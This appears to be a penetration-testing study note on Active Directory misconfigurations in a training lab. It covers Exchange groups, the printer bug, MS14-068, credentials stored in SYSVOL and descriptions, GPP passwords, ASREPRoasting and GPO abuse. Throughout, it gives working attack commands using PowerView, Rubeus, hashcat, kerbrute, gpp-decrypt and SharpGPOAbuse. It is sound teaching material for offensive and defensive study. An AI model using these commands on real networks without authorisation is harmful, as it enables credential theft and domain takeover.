#### **Overview**

In a penetration test or red team engagement, identifying **misconfigurations in Active Directory (AD)** can be just as valuable as finding **vulnerabilities**. Many **default settings, weak permissions, and overlooked configurations** create opportunities for attackers to escalate privileges or move laterally within the network.

## 1 Exchange-Related Group Memberships

Microsoft Exchange is often **over-privileged** in AD environments. Some key Exchange groups to focus on:

### **Exchange Windows Permissions Group**

- **Not a protected group**, but members can **modify DACLs (Discretionary Access Control Lists) on the domain object**.
- Can be used to **grant DCSync privileges**, allowing an attacker to dump **password hashes** from the domain.

**How to exploit it:**

- If an attacker can modify DACLs, they can **give themselves the Replication-Get-Changes-All privilege** and use **Mimikatz DCSync** to steal credentials.

### **Organization Management Group**

- Has **full control** over Exchange mailboxes.
- Often includes **domain admins or other privileged users**.
- **Exploiting it** can lead to **mailbox compromise** or **pivoting to privileged accounts**.

### **PrivExchange Attack**

- **Any domain user with a mailbox** can **force an Exchange server to authenticate** to an attacker's system over **HTTP**.
- If Exchange is misconfigured (pre-2019 CU), it can be **relayed to LDAP** to grant **DCSync privileges** â†’ **Domain Admin compromise**.

##  2 Printer Bug (MS-RPRN)

### **What is it?**

- Any domain user can abuse the **MS-RPRN protocol** to force a Windows print server to **authenticate to an attacker-controlled machine** via **SMB**.

### **How is it exploited?**

- The **spooler service** runs as **SYSTEM**, meaning it authenticates at the highest level.
- This can be **relayed to LDAP** to:
    - **Grant DCSync privileges** (password hash dump).
    - **Enable Resource-Based Constrained Delegation (RBCD)**.
    - **Compromise a domain controller in a trusted forest** (if misconfigured).

**How to check for vulnerability:**
```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

## 3 MS14-068 (Kerberos Privilege Escalation)

### **What is it?**

- A **Kerberos protocol flaw** that allows a **low-privileged user** to forge **PAC (Privilege Attribute Certificate) data**.
- The forged PAC tricks the **KDC** (Key Distribution Center) into thinking the user is a **Domain Admin**.

### **How to exploit it?**

- Use **Impacket** or **PyKEK** to generate a forged **TGT** (Golden Ticket) and escalate privileges.
---
## 4 Sniffing LDAP Credentials

Many **applications & devices** store **LDAP credentials** in their **configuration pages**:

- Web admin consoles.
- Network printers.
- Application servers.

### **How is it exploited?**

1. Change the LDAP IP to the attacker's machine.
2. Set up a **Netcat listener** on **port 389**.
3. If the application tests the connection, it sends **credentials in cleartext**.

## 5 DNS Enumeration via Adidnsdump
### **Why is it useful?**

- **DNS records** in AD can **reveal critical systems** (e.g., `JENKINS.INLANEFREIGHT.LOCAL`).
- Many organizations use **non-descriptive hostnames**, making **BloodHound enumeration** less useful.

 **Run adidnsdump:**
```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
- The **`-r` flag** attempts to resolve **hidden records**.

---

## 6 Passwords in the AD Description Field

- **Admins sometimes store credentials** in **user descriptions**.
- This can be easily queried using **PowerView**.

**PowerView query:**
```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```
- If passwords are found, **password spraying** can be used to find **other valid logins**.

---
## 7 PASSWD_NOTREQD Flag

### **What is it?**

- If the `PASSWD_NOTREQD` flag is set, the user **does not need a password**.
- Could be a **blank password**, or **very weak**.

**PowerView query:**
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

---

##  8 Credentials in SYSVOL & SMB Shares

- **SYSVOL contains startup/login scripts** that often **store plaintext credentials**.

**Check for scripts in SYSVOL:**
```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
- Look for **.bat, .vbs, .ps1** files with passwords.

- Example of a stored password:
```powershell
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

---

## 9 Group Policy Preference (GPP) Passwords

- **GPP files** in SYSVOL may store **AES-encrypted passwords**.
- **Microsoft leaked the decryption key**!

**Decrypting GPP passwords:**
```bash
gpp-decrypt <cpassword>
```

---

## 10 ASREPRoasting

### **What is it?**

- If **Kerberos pre-authentication is disabled**, any user can request an **AS-REP ticket**.
- The ticket is **encrypted with the user's password hash**, which can be **cracked offline**.

**Enumerating accounts with pre-auth disabled:**
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

- Extracting AS-REP hashes with Rubeus:
```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

- Cracking ther AS-REP hash with Hashcat:
```bash
hashcat -m 18200 hash.txt /usr/share/wordlist/rockyou.txt
```

Or use `kerbrute` in Linux
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

## 11 Group Policy Object (GPO) Abuse

- If an attacker **modifies a GPO**, they can:
    - **Add themselves as a local admin** on targeted computers.
    - **Create a scheduled task** to execute payloads.
    - **Push a malicious logon script**.
Enumerating GPOs using PowerView:
```powershell
Get-DomainGPO | Select-Object displayname
```

Checking if Domain Users can modify a GPO:
```powershell
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Exploit using SharpGPOAbuse:
```powershell
SharpGPOAbuse.exe --AddUser --UserAccount attacker --Password Pass123! --GPOName "Workstation GPO"
```

### **Key Takeaways**

- **Exchange & Print Spooler services** are common **misconfiguration points** leading to **DCSync attacks**.  

-  **SYSVOL & SMB shares** often contain **hardcoded credentials** in scripts. 

-  **GPP passwords** can be **decrypted** using a public Microsoft key.  

-  **ASREPRoasting** allows for **offline cracking** of weak passwords.  

-  **Group Policy Misconfigurations** enable **remote code execution** across multiple machines.
